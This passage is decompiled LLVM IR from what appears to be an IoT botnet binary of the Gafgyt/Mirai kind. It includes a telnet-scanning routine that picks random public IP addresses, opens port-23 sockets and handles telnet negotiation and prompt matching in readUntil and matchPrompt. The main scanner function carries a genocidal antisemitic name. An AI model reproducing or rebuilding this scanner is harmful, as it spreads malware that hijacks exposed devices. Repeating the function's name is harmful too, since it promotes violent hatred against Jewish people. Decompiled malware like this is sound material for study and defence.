  uselistorder i32 (i32, i32, i32, i32)* @send, { 2, 1, 0, 4, 3 }
  uselistorder label %dec_label_pc_1000d2dc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1000d2a0, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i32 %arg1) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r3, align 4
  %v0_1000d328 = call i32 @__GI_strlen()
  store i32 ptrtoint ([6 x i8]* @global_var_1002bc34.512 to i32), i32* @r3, align 4
  %v0_1000d46410 = call i32 @__GI_strlen()
  %v2_1000d46c12 = icmp eq i32 %v0_1000d46410, 0
  br i1 %v2_1000d46c12, label %dec_label_pc_1000d47c, label %dec_label_pc_1000d354.preheader.lr.ph

dec_label_pc_1000d354.preheader.lr.ph:            ; preds = %entry
  %v2_1000d370 = add i32 %v0_1000d328, %arg1
  br label %dec_label_pc_1000d354.preheader

dec_label_pc_1000d348:                            ; preds = %dec_label_pc_1000d3dc, %dec_label_pc_1000d3b4, %dec_label_pc_1000d38c, %dec_label_pc_1000d364
  %v1_1000d34c = add nsw i32 %stack_var_-40.08, 1
  %v3_1000d35c = icmp sgt i32 %v0_1000d328, %v1_1000d34c
  br i1 %v3_1000d35c, label %dec_label_pc_1000d364, label %dec_label_pc_1000d404

dec_label_pc_1000d364:                            ; preds = %dec_label_pc_1000d354.preheader, %dec_label_pc_1000d348
  %stack_var_-40.08 = phi i32 [ %v1_1000d34c, %dec_label_pc_1000d348 ], [ %stack_var_-40.115, %dec_label_pc_1000d354.preheader ]
  %v2_1000d378 = sub i32 %v2_1000d370, %stack_var_-40.08
  %v1_1000d37c = inttoptr i32 %v2_1000d378 to i8*
  %v2_1000d37c = load i8, i8* %v1_1000d37c, align 1
  %v3_1000d384 = icmp eq i8 %v2_1000d37c, 0
  br i1 %v3_1000d384, label %dec_label_pc_1000d348, label %dec_label_pc_1000d38c

dec_label_pc_1000d38c:                            ; preds = %dec_label_pc_1000d364
  %v2_1000d3a4 = load i8, i8* %v1_1000d37c, align 1
  %v3_1000d3ac = icmp eq i8 %v2_1000d3a4, 32
  br i1 %v3_1000d3ac, label %dec_label_pc_1000d348, label %dec_label_pc_1000d3b4

dec_label_pc_1000d3b4:                            ; preds = %dec_label_pc_1000d38c
  %v2_1000d3cc = load i8, i8* %v1_1000d37c, align 1
  %v3_1000d3d4 = icmp eq i8 %v2_1000d3cc, 13
  br i1 %v3_1000d3d4, label %dec_label_pc_1000d348, label %dec_label_pc_1000d3dc

dec_label_pc_1000d3dc:                            ; preds = %dec_label_pc_1000d3b4
  %v2_1000d3f4 = load i8, i8* %v1_1000d37c, align 1
  %v3_1000d3fc = icmp eq i8 %v2_1000d3f4, 10
  br i1 %v3_1000d3fc, label %dec_label_pc_1000d348, label %dec_label_pc_1000d404

dec_label_pc_1000d404:                            ; preds = %dec_label_pc_1000d3dc, %dec_label_pc_1000d348, %dec_label_pc_1000d354.preheader
  %stack_var_-40.0.lcssa = phi i32 [ %stack_var_-40.115, %dec_label_pc_1000d354.preheader ], [ %stack_var_-40.08, %dec_label_pc_1000d3dc ], [ %v1_1000d34c, %dec_label_pc_1000d348 ]
  %v2_1000d418 = sub i32 %v2_1000d370, %stack_var_-40.0.lcssa
  %v1_1000d41c = inttoptr i32 %v2_1000d418 to i8*
  %v2_1000d41c = load i8, i8* %v1_1000d41c, align 1
  %v2_1000d430 = add i32 %storemerge316, ptrtoint ([6 x i8]* @global_var_1002bc34.512 to i32)
  %v1_1000d434 = inttoptr i32 %v2_1000d430 to i8*
  %v2_1000d434 = load i8, i8* %v1_1000d434, align 1
  %v4_1000d43c = icmp eq i8 %v2_1000d41c, %v2_1000d434
  br i1 %v4_1000d43c, label %dec_label_pc_1000d47c, label %dec_label_pc_1000d450

dec_label_pc_1000d450:                            ; preds = %dec_label_pc_1000d404
  %v1_1000d454 = add i32 %storemerge316, 1
  store i32 ptrtoint ([6 x i8]* @global_var_1002bc34.512 to i32), i32* @r3, align 4
  %v0_1000d464 = call i32 @__GI_strlen()
  %v2_1000d46c = icmp ult i32 %v1_1000d454, %v0_1000d464
  br i1 %v2_1000d46c, label %dec_label_pc_1000d354.preheader, label %dec_label_pc_1000d47c

dec_label_pc_1000d354.preheader:                  ; preds = %dec_label_pc_1000d354.preheader.lr.ph, %dec_label_pc_1000d450
  %storemerge316 = phi i32 [ 0, %dec_label_pc_1000d354.preheader.lr.ph ], [ %v1_1000d454, %dec_label_pc_1000d450 ]
  %stack_var_-40.115 = phi i32 [ 0, %dec_label_pc_1000d354.preheader.lr.ph ], [ %stack_var_-40.0.lcssa, %dec_label_pc_1000d450 ]
  %v3_1000d35c6 = icmp sgt i32 %v0_1000d328, %stack_var_-40.115
  br i1 %v3_1000d35c6, label %dec_label_pc_1000d364, label %dec_label_pc_1000d404

dec_label_pc_1000d47c:                            ; preds = %entry, %dec_label_pc_1000d404, %dec_label_pc_1000d450
  %storemerge = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_1000d404 ], [ 0, %dec_label_pc_1000d450 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-40.115, { 2, 0, 1 }
  uselistorder i32 %storemerge316, { 1, 0 }
  uselistorder i32 %v1_1000d454, { 1, 0 }
  uselistorder i32 %v0_1000d328, { 1, 2, 0 }
  uselistorder i32 ptrtoint ([6 x i8]* @global_var_1002bc34.512 to i32), { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d47c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d354.preheader, { 1, 0 }
  uselistorder label %dec_label_pc_1000d404, { 2, 0, 1 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-216 = alloca i32, align 4
  %stack_var_-192 = alloca i32, align 4
  %v0_1000d4d0 = load i32, i32* @r10, align 4
  store i32 %arg4, i32* %stack_var_-64, align 4
  %v1_1000d7105 = add i32 %v0_1000d4d0, 2
  %v2_1000d7186 = icmp slt i32 %v1_1000d7105, %arg7
  br i1 %v2_1000d7186, label %dec_label_pc_1000d720.lr.ph, label %dec_label_pc_1000d750

dec_label_pc_1000d720.lr.ph:                      ; preds = %entry
  %v2_1000d508 = ptrtoint i32* %stack_var_-192 to i32
  %v1_1000d550 = udiv i32 %arg1, 32
  %v1_1000d558 = mul nuw nsw i32 %v1_1000d550, 4
  %v2_1000d55c = ptrtoint i32* %stack_var_-216 to i32
  %v2_1000d560 = add nuw nsw i32 %v1_1000d558, 24
  %v1_1000d564 = add i32 %v2_1000d560, %v2_1000d55c
  %v1_1000d568 = inttoptr i32 %v1_1000d564 to i32*
  %v1_1000d570 = urem i32 %arg1, 32
  %v3_1000d578 = shl i32 1, %v1_1000d570
  %v1_1000d598 = add i32 %arg1, 1
  %v2_1000d5a0 = ptrtoint i32* %stack_var_-64 to i32
  %v4_1000d6d0 = inttoptr i32 %arg2 to i8*
  %v3_1000d6e4 = icmp eq i32 %arg3, 0
  %v2_1000d730 = icmp sgt i32 %arg5, 0
  br label %dec_label_pc_1000d720

dec_label_pc_1000d508:                            ; preds = %dec_label_pc_1000d72c, %dec_label_pc_1000d720
  store i32 %v2_1000d508, i32* %stack_var_-216, align 4
  store i32 0, i32* %stack_var_-192, align 4
  br label %dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge

dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge: ; preds = %dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge.dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge_crit_edge, %dec_label_pc_1000d508
  %v3_1000d520.pre = phi i32 [ %v2_1000d508, %dec_label_pc_1000d508 ], [ %v3_1000d520.pre.pre, %dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge.dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge_crit_edge ]
  %v1_1000d53836 = phi i32 [ 1, %dec_label_pc_1000d508 ], [ %v1_1000d538, %dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge.dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge_crit_edge ]
  %v1_1000d524 = mul nuw nsw i32 %v1_1000d53836, 4
  %v2_1000d528 = add i32 %v1_1000d524, %v3_1000d520.pre
  %v2_1000d530 = inttoptr i32 %v2_1000d528 to i32*
  store i32 0, i32* %v2_1000d530, align 4
  %v1_1000d538 = add nuw nsw i32 %v1_1000d53836, 1
  %tmp33 = icmp ult i32 %v1_1000d538, 32
  br i1 %tmp33, label %dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge.dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge_crit_edge, label %dec_label_pc_1000d54c

dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge.dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge_crit_edge: ; preds = %dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge
  %v3_1000d520.pre.pre = load i32, i32* %stack_var_-216, align 4
  br label %dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge

dec_label_pc_1000d54c:                            ; preds = %dec_label_pc_1000d51c.dec_label_pc_1000d51c_crit_edge
  %v2_1000d568 = load i32, i32* %v1_1000d568, align 4
  %v2_1000d57c = or i32 %v2_1000d568, %v3_1000d578
  store i32 %v2_1000d57c, i32* %v1_1000d568, align 4
  store i32 268490172, i32* @lr, align 4
  %v5_1000d5b8 = call i32 @__libc_select(i32 %v1_1000d598, i32 %v2_1000d508, i32 0, i32 0, i32 %v2_1000d5a0)
  %tmp34 = icmp slt i32 %v5_1000d5b8, 1
  br i1 %tmp34, label %dec_label_pc_1000d750, label %dec_label_pc_1000d5c8

dec_label_pc_1000d5c8:                            ; preds = %dec_label_pc_1000d54c
  %v2_1000d5d4 = add i32 %stack_var_-196.09, %arg6
  store i32 268490224, i32* @lr, align 4
  %v4_1000d5ec = call i32 @recv(i32 %arg1, i32 %v2_1000d5d4, i32 1, i32 0)
  %v4_1000d600 = icmp eq i32 %v4_1000d5ec, -1
  br i1 %v4_1000d600, label %dec_label_pc_1000d614, label %dec_label_pc_1000d608

dec_label_pc_1000d608:                            ; preds = %dec_label_pc_1000d5c8
  %v3_1000d60c = icmp eq i32 %v4_1000d5ec, 0
  br i1 %v3_1000d60c, label %dec_label_pc_1000d614, label %dec_label_pc_1000d620

dec_label_pc_1000d614:                            ; preds = %dec_label_pc_1000d608, %dec_label_pc_1000d5c8
  br label %dec_label_pc_1000d758

dec_label_pc_1000d620:                            ; preds = %dec_label_pc_1000d608
  %v2_1000d628 = add i32 %v4_1000d5ec, %stack_var_-196.09
  %v4_1000d630 = inttoptr i32 %v2_1000d5d4 to i8*
  %v3_1000d634 = load i8, i8* %v4_1000d630, align 1
  %v3_1000d63c = icmp eq i8 %v3_1000d634, -1
  br i1 %v3_1000d63c, label %dec_label_pc_1000d644, label %dec_label_pc_1000d6c8

dec_label_pc_1000d644:                            ; preds = %dec_label_pc_1000d620
  %v1_1000d648 = add i32 %v2_1000d5d4, 1
  store i32 268490336, i32* @lr, align 4
  %v4_1000d65c = call i32 @recv(i32 %arg1, i32 %v1_1000d648, i32 2, i32 0)
  %v4_1000d670 = icmp eq i32 %v4_1000d65c, -1
  br i1 %v4_1000d670, label %dec_label_pc_1000d684, label %dec_label_pc_1000d678

dec_label_pc_1000d678:                            ; preds = %dec_label_pc_1000d644
  %v3_1000d67c = icmp eq i32 %v4_1000d65c, 0
  br i1 %v3_1000d67c, label %dec_label_pc_1000d684, label %dec_label_pc_1000d690

dec_label_pc_1000d684:                            ; preds = %dec_label_pc_1000d678, %dec_label_pc_1000d644
  br label %dec_label_pc_1000d758

dec_label_pc_1000d690:                            ; preds = %dec_label_pc_1000d678
  %v2_1000d698 = add i32 %v4_1000d65c, %v2_1000d628
  store i32 268490416, i32* @lr, align 4
  %v4_1000d6ac = call i32 @negotiate(i32 %arg1, i32 %v2_1000d5d4, i32 3, i32 %v2_1000d628)
  %v3_1000d6b4 = icmp eq i32 %v4_1000d6ac, 0
  br i1 %v3_1000d6b4, label %dec_label_pc_1000d6bc, label %dec_label_pc_1000d70c.backedge

dec_label_pc_1000d6bc:                            ; preds = %dec_label_pc_1000d690
  br label %dec_label_pc_1000d758

dec_label_pc_1000d6c8:                            ; preds = %dec_label_pc_1000d620
  store i32 268490452, i32* @lr, align 4
  %v5_1000d6d0 = call i32 @strstr(i32 %arg6, i8* %v4_1000d6d0, i32 %v2_1000d5d4)
  %v3_1000d6d8 = icmp eq i32 %v5_1000d6d0, 0
  br i1 %v3_1000d6d8, label %dec_label_pc_1000d6e0, label %dec_label_pc_1000d744

dec_label_pc_1000d6e0:                            ; preds = %dec_label_pc_1000d6c8
  br i1 %v3_1000d6e4, label %dec_label_pc_1000d70c.backedge, label %dec_label_pc_1000d6ec

dec_label_pc_1000d70c.backedge:                   ; preds = %dec_label_pc_1000d6e0, %dec_label_pc_1000d6ec, %dec_label_pc_1000d690
  %stack_var_-196.0.be = phi i32 [ %v2_1000d698, %dec_label_pc_1000d690 ], [ %v2_1000d628, %dec_label_pc_1000d6e0 ], [ %v2_1000d628, %dec_label_pc_1000d6ec ]
  %v1_1000d710 = add i32 %stack_var_-196.0.be, 2
  %v2_1000d718 = icmp slt i32 %v1_1000d710, %arg7
  br i1 %v2_1000d718, label %dec_label_pc_1000d70c.backedge.dec_label_pc_1000d720_crit_edge, label %dec_label_pc_1000d750

dec_label_pc_1000d70c.backedge.dec_label_pc_1000d720_crit_edge: ; preds = %dec_label_pc_1000d70c.backedge
  %v3_1000d720.pre = load i32, i32* %stack_var_-64, align 4
  br label %dec_label_pc_1000d720

dec_label_pc_1000d6ec:                            ; preds = %dec_label_pc_1000d6e0
  %v1_1000d6f0 = call i32 @matchPrompt(i32 %arg6)
  %v3_1000d6f8 = icmp eq i32 %v1_1000d6f0, 0
  br i1 %v3_1000d6f8, label %dec_label_pc_1000d70c.backedge, label %dec_label_pc_1000d744

dec_label_pc_1000d720:                            ; preds = %dec_label_pc_1000d70c.backedge.dec_label_pc_1000d720_crit_edge, %dec_label_pc_1000d720.lr.ph
  %v3_1000d720 = phi i32 [ %arg4, %dec_label_pc_1000d720.lr.ph ], [ %v3_1000d720.pre, %dec_label_pc_1000d70c.backedge.dec_label_pc_1000d720_crit_edge ]
  %stack_var_-196.09 = phi i32 [ %v0_1000d4d0, %dec_label_pc_1000d720.lr.ph ], [ %stack_var_-196.0.be, %dec_label_pc_1000d70c.backedge.dec_label_pc_1000d720_crit_edge ]
  %v2_1000d724 = icmp sgt i32 %v3_1000d720, 0
  br i1 %v2_1000d724, label %dec_label_pc_1000d508, label %dec_label_pc_1000d72c

dec_label_pc_1000d72c:                            ; preds = %dec_label_pc_1000d720
  br i1 %v2_1000d730, label %dec_label_pc_1000d508, label %dec_label_pc_1000d750

dec_label_pc_1000d744:                            ; preds = %dec_label_pc_1000d6c8, %dec_label_pc_1000d6ec
  br label %dec_label_pc_1000d758

dec_label_pc_1000d750:                            ; preds = %dec_label_pc_1000d70c.backedge, %dec_label_pc_1000d72c, %dec_label_pc_1000d54c, %entry
  br label %dec_label_pc_1000d758

dec_label_pc_1000d758:                            ; preds = %dec_label_pc_1000d744, %dec_label_pc_1000d6bc, %dec_label_pc_1000d684, %dec_label_pc_1000d614, %dec_label_pc_1000d750
  %stack_var_-24.0 = phi i32 [ 0, %dec_label_pc_1000d750 ], [ 1, %dec_label_pc_1000d744 ], [ 0, %dec_label_pc_1000d614 ], [ 0, %dec_label_pc_1000d684 ], [ 0, %dec_label_pc_1000d6bc ]
  ret i32 %stack_var_-24.0

; uselistorder directives
  uselistorder i32 %stack_var_-196.09, { 1, 0 }
  uselistorder i32 %stack_var_-196.0.be, { 1, 0 }
  uselistorder i32 %v2_1000d628, { 1, 2, 3, 0 }
  uselistorder i32 %v1_1000d538, { 1, 0 }
  uselistorder i32 %v2_1000d508, { 1, 0, 2 }
  uselistorder i32* %stack_var_-64, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32, i32)* @negotiate, { 1, 0 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg6, { 1, 2, 0 }
  uselistorder i32 %arg1, { 2, 3, 4, 5, 1, 0 }
  uselistorder label %dec_label_pc_1000d758, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_1000d750, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_1000d744, { 1, 0 }
  uselistorder label %dec_label_pc_1000d70c.backedge, { 1, 0, 2 }
}

define i32 @sclose(i32 %arg1) local_unnamed_addr {
entry:
  %v2_1000d794 = icmp sgt i32 %arg1, 2
  br i1 %v2_1000d794, label %dec_label_pc_1000d7a8, label %dec_label_pc_1000d7b8

dec_label_pc_1000d7a8:                            ; preds = %entry
  store i32 ptrtoint (i32* @global_var_1000d7b0.513 to i32), i32* @lr, align 4
  %v1_1000d7ac = call i32 @close(i32 %arg1)
  br label %dec_label_pc_1000d7b8

dec_label_pc_1000d7b8:                            ; preds = %entry, %dec_label_pc_1000d7a8
  %storemerge = phi i32 [ 0, %dec_label_pc_1000d7a8 ], [ 1, %entry ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder label %dec_label_pc_1000d7b8, { 1, 0 }
}

define i32 @BurnTheJews(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-640 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v4_1000d7d8 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v4_1000d7d8, i32* %stack_var_-640, align 4
  store i32 268490764, i32* @lr, align 4
  %v0_1000d808 = call i32 @fork()
  %v3_1000d810 = icmp eq i32 %v0_1000d808, 0
  br i1 %v3_1000d810, label %dec_label_pc_1000ebb8, label %dec_label_pc_1000d818

dec_label_pc_1000d818:                            ; preds = %entry
  store i32 268490784, i32* @lr, align 4
  %v1_1000d81c = call i32 @__GI_time(i32 0)
  store i32 268490792, i32* @lr, align 4
  %v0_1000d824 = call i32 @__libc_getpid()
  %v2_1000d82c = xor i32 %v1_1000d81c, %v0_1000d824
  store i32 268490804, i32* @lr, align 4
  %v0_1000d830 = call i32 @getppid()
  %v2_1000d838 = add i32 %v2_1000d82c, %v0_1000d830
  store i32 ptrtoint ([3 x i8]* @global_var_1000d844.514 to i32), i32* @lr, align 4
  %v1_1000d840 = call i32 @srand(i32 %v2_1000d838)
  store i32 268490828, i32* @lr, align 4
  %v1_1000d848 = call i32 @__GI_time(i32 0)
  store i32 268490836, i32* @lr, align 4
  %v0_1000d850 = call i32 @__libc_getpid()
  %v2_1000d858 = xor i32 %v1_1000d848, %v0_1000d850
  %v1_1000d860 = call i32 @init_rand(i32 %v2_1000d858)
  store i32 268490856, i32* @lr, align 4
  %v0_1000d864 = call i32 @getdtablesize()
  %v1_1000d86c = add i32 %v0_1000d864, -100
  %v3_1000d87c = icmp sgt i32 %v1_1000d86c, %arg2
  br i1 %v3_1000d87c, label %dec_label_pc_1000d884, label %dec_label_pc_1000d88c

dec_label_pc_1000d884:                            ; preds = %dec_label_pc_1000d818
  br label %dec_label_pc_1000d88c

dec_label_pc_1000d88c:                            ; preds = %dec_label_pc_1000d818, %dec_label_pc_1000d884
  %stack_var_-596.0 = phi i32 [ %arg2, %dec_label_pc_1000d884 ], [ %v1_1000d86c, %dec_label_pc_1000d818 ]
  store i32 2, i32* %stack_var_-56, align 4
  store i32 23, i32* @r3, align 4
  %v1_1000d898 = call i32 @htons(i32 23)
  %v2_1000d8a4 = ptrtoint i32* %stack_var_-56 to i32
  %v2_1000d8a8 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_1000d8a8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268490940, i32* @lr, align 4
  %v0_1000d8b8 = call i32 @__GI_memset()
  store i32 1025, i32* @r3, align 4
  store i32 268490948, i32* @lr, align 4
  %v0_1000d8c0 = call i32 @malloc()
  store i32 %v0_1000d8c0, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 1025, i32* @r5, align 4
  store i32 268490972, i32* @lr, align 4
  %v0_1000d8d8 = call i32 @__GI_memset()
  %v1_1000d8e0 = mul i32 %stack_var_-596.0, 32
  %v1_1000d8e4 = or i32 %v1_1000d8e0, 15
  %v1_1000d8e8 = add i32 %v1_1000d8e4, 15
  %v1_1000d8ec = and i32 %v1_1000d8e8, -16
  %v2_1000d8f4 = load i32, i32* %stack_var_-640, align 4
  %v1_1000d8fc = load i32, i32* @r1, align 4
  %v3_1000d8fc = sub i32 %v1_1000d8fc, %v1_1000d8ec
  %v4_1000d8fc = inttoptr i32 %v3_1000d8fc to i32*
  store i32 %v2_1000d8f4, i32* %v4_1000d8fc, align 4
  %v1_1000d90c = add i32 %v3_1000d8fc, 23
  %v1_1000d910 = and i32 %v1_1000d90c, -16
  %v1_1000d92c = mul i32 %stack_var_-596.0, 5
  store i32 %v1_1000d910, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 %v1_1000d92c, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_1000d940.516 to i32), i32* @lr, align 4
  %v0_1000d93c = call i32 @__GI_memset()
  %v2_1000d9b410 = icmp sgt i32 %stack_var_-596.0, 0
  br i1 %v2_1000d9b410, label %dec_label_pc_1000d94c, label %dec_label_pc_1000d9bc.preheader

dec_label_pc_1000d94c:                            ; preds = %dec_label_pc_1000d88c, %dec_label_pc_1000d94c
  %storemerge313 = phi i32 [ %v1_1000d9a4, %dec_label_pc_1000d94c ], [ 0, %dec_label_pc_1000d88c ]
  %v1_1000d954 = mul i32 %storemerge313, 32
  %v2_1000d958 = add i32 %v1_1000d954, %v1_1000d910
  store i32 %v2_1000d958, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 32, i32* @r5, align 4
  store i32 268491116, i32* @lr, align 4
  %v0_1000d968 = call i32 @__GI_memset()
  %v3_1000d980 = or i32 %v2_1000d958, 9
  %v4_1000d980 = inttoptr i32 %v3_1000d980 to i8*
  store i8 1, i8* %v4_1000d980, align 1
  %v1_1000d994 = add i32 %v2_1000d958, 28
  %v2_1000d99c = inttoptr i32 %v1_1000d994 to i32*
  store i32 %v0_1000d8c0, i32* %v2_1000d99c, align 4
  %v1_1000d9a4 = add nuw nsw i32 %storemerge313, 1
  %v2_1000d9b4 = icmp slt i32 %v1_1000d9a4, %stack_var_-596.0
  br i1 %v2_1000d9b4, label %dec_label_pc_1000d94c, label %dec_label_pc_1000d9bc.preheader

dec_label_pc_1000d9bc.preheader:                  ; preds = %dec_label_pc_1000d94c, %dec_label_pc_1000d88c
  %v2_1000da04 = add i32 %v1_1000d910, 16
  br label %dec_label_pc_1000d9bc

dec_label_pc_1000d9bc:                            ; preds = %dec_label_pc_1000d9bc, %dec_label_pc_1000eb98, %dec_label_pc_1000d9bc.preheader
  br i1 %v2_1000d9b410, label %dec_label_pc_1000d9c8, label %dec_label_pc_1000d9bc

dec_label_pc_1000d9c8:                            ; preds = %dec_label_pc_1000d9bc, %dec_label_pc_1000eb98
  %storemerge48 = phi i32 [ %v1_1000eb9c, %dec_label_pc_1000eb98 ], [ 0, %dec_label_pc_1000d9bc ]
  %v1_1000d9d0 = mul i32 %storemerge48, 32
  %v2_1000d9d4 = add i32 %v1_1000d9d0, %v1_1000d910
  %v1_1000d9d8 = add i32 %v2_1000d9d4, 16
  %v1_1000d9dc = inttoptr i32 %v1_1000d9d8 to i32*
  %v2_1000d9dc = load i32, i32* %v1_1000d9dc, align 16
  %v3_1000d9e0 = icmp eq i32 %v2_1000d9dc, 0
  br i1 %v3_1000d9e0, label %dec_label_pc_1000d9e8, label %dec_label_pc_1000da10

dec_label_pc_1000d9e8:                            ; preds = %dec_label_pc_1000d9c8
  store i32 268491252, i32* @lr, align 4
  %v1_1000d9f0 = call i32 @__GI_time(i32 0)
  %v1_1000da00 = mul i32 %storemerge48, 32
  %v1_1000da08 = add i32 %v2_1000da04, %v1_1000da00
  %v2_1000da0c = inttoptr i32 %v1_1000da08 to i32*
  store i32 %v1_1000d9f0, i32* %v2_1000da0c, align 16
  br label %dec_label_pc_1000da10

dec_label_pc_1000da10:                            ; preds = %dec_label_pc_1000d9c8, %dec_label_pc_1000d9e8
  %v1_1000da20 = or i32 %v2_1000d9d4, 8
  %v2_1000da20 = inttoptr i32 %v1_1000da20 to i8*
  %v3_1000da20 = load i8, i8* %v2_1000da20, align 8
  %v2_1000da30 = icmp ugt i8 %v3_1000da20, 8
  br i1 %v2_1000da30, label %dec_label_pc_1000eb98, label %dec_label_pc_1000da38

dec_label_pc_1000da38:                            ; preds = %dec_label_pc_1000da10
  %v4_1000da20 = zext i8 %v3_1000da20 to i32
  %v1_1000da3c = mul nuw nsw i32 %v4_1000da20, 4
  %v2_1000da48 = add i32 %v1_1000da3c, ptrtoint (i32* @global_var_1002bd40.517 to i32)
  %v1_1000da4c = inttoptr i32 %v2_1000da48 to i32*
  %v2_1000da4c = load i32, i32* %v1_1000da4c, align 4
  %v2_1000da58 = add i32 %v2_1000da4c, ptrtoint (i32* @global_var_1002bd40.517 to i32)
  call void @__pseudo_branch(i32 %v2_1000da58)
  %v1_1000da74 = or i32 %v2_1000d9d4, 9
  %v2_1000da74 = inttoptr i32 %v1_1000da74 to i8*
  %v3_1000da74 = load i8, i8* %v2_1000da74, align 1
  %v3_1000da7c = icmp eq i8 %v3_1000da74, 1
  br i1 %v3_1000da7c, label %dec_label_pc_1000da84, label %dec_label_pc_1000db00

dec_label_pc_1000da84:                            ; preds = %dec_label_pc_1000da38
  %v1_1000da94 = add i32 %v2_1000d9d4, 28
  %v1_1000da98 = inttoptr i32 %v1_1000da94 to i32*
  %v2_1000da98 = load i32, i32* %v1_1000da98, align 4
  store i32 %v2_1000d9d4, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 32, i32* @r5, align 4
  store i32 268491456, i32* @lr, align 4
  %v0_1000dabc = call i32 @__GI_memset()
  store i32 %v2_1000da98, i32* %v1_1000da98, align 4
  %v2_1000dae0 = call i32 @getRandomPublicIP(i32 %v0_1000dabc, i32 %v1_1000da94)
  %v0_1000daec = load i32, i32* @r29, align 4
  %v1_1000daec = mul i32 %v0_1000daec, 32
  %v2_1000daf0 = add i32 %v1_1000daec, %v1_1000d910
  %v1_1000daf4 = or i32 %v2_1000daf0, 4
  %v2_1000daf8 = inttoptr i32 %v1_1000daf4 to i32*
  store i32 %v2_1000dae0, i32* %v2_1000daf8, align 4
  br label %dec_label_pc_1000dbbc

dec_label_pc_1000db00:                            ; preds = %dec_label_pc_1000da38
  %v3_1000db10 = load i8, i8* %v2_1000da74, align 1
  %v3_1000db18 = icmp eq i8 %v3_1000db10, 0
  br i1 %v3_1000db18, label %dec_label_pc_1000db20, label %dec_label_pc_1000dbbc

dec_label_pc_1000db20:                            ; preds = %dec_label_pc_1000db00
  %v1_1000db30 = or i32 %v2_1000d9d4, 10
  %v2_1000db30 = inttoptr i32 %v1_1000db30 to i8*
  %v3_1000db30 = load i8, i8* %v2_1000db30, align 2
  %tmp34 = icmp ult i8 %v3_1000db30, 99
  br i1 %tmp34, label %dec_label_pc_1000db5c, label %dec_label_pc_1000db40

dec_label_pc_1000db40:                            ; preds = %dec_label_pc_1000db20
  store i8 1, i8* %v2_1000da74, align 1
  br label %dec_label_pc_1000eb98

dec_label_pc_1000db5c:                            ; preds = %dec_label_pc_1000db20
  %v3_1000db6c = load i8, i8* %v2_1000db30, align 2
  %v1_1000db74 = add i8 %v3_1000db6c, 1
  store i8 %v1_1000db74, i8* %v2_1000db30, align 2
  %v1_1000db9c = or i32 %v2_1000d9d4, 11
  %v2_1000db9c = inttoptr i32 %v1_1000db9c to i8*
  %v3_1000db9c = load i8, i8* %v2_1000db9c, align 1
  %v1_1000dba4 = add i8 %v3_1000db9c, 1
  store i8 %v1_1000dba4, i8* %v2_1000db9c, align 1
  br label %dec_label_pc_1000dbbc

dec_label_pc_1000dbbc:                            ; preds = %dec_label_pc_1000db00, %dec_label_pc_1000da84, %dec_label_pc_1000db5c
  store i32 2, i32* %stack_var_-56, align 4
  store i32 23, i32* @r3, align 4
  %v1_1000dbc8 = call i32 @htons(i32 23)
  store i32 %v2_1000d8a8, i32* @r3, align 4
  store i32 0, i32* @r4, align 4
  store i32 8, i32* @r5, align 4
  store i32 268491756, i32* @lr, align 4
  %v0_1000dbe8 = call i32 @__GI_memset()
  store i32 268491804, i32* @lr, align 4
  %v3_1000dc18 = call i32 @socket(i32 2, i32 1, i32 0)
  %v1_1000dc24 = mul i32 %storemerge48, 32
  %v2_1000dc28 = add i32 %v1_1000dc24, %v1_1000d910
  %v2_1000dc2c = inttoptr i32 %v2_1000dc28 to i32*
  store i32 %v3_1000dc18, i32* %v2_1000dc2c, align 16
  %v1_1000dc40 = inttoptr i32 %v2_1000d9d4 to i32*
  %v2_1000dc40 = load i32, i32* %v1_1000dc40, align 16
  %v4_1000dc48 = icmp eq i32 %v2_1000dc40, -1
  br i1 %v4_1000dc48, label %dec_label_pc_1000eb98, label %dec_label_pc_1000dc50

dec_label_pc_1000dc50:                            ; preds = %dec_label_pc_1000dbbc
  %v2_1000dc74 = load i32, i32* %v1_1000dc40, align 16
  store i32 268491916, i32* @lr, align 4
  %v3_1000dc88 = call i32 @fcntl(i32 %v2_1000dc74, i32 3, i32 0)
  %v1_1000dc90 = or i32 %v3_1000dc88, 2048
  %v0_1000dc94 = load i32, i32* @r29, align 4
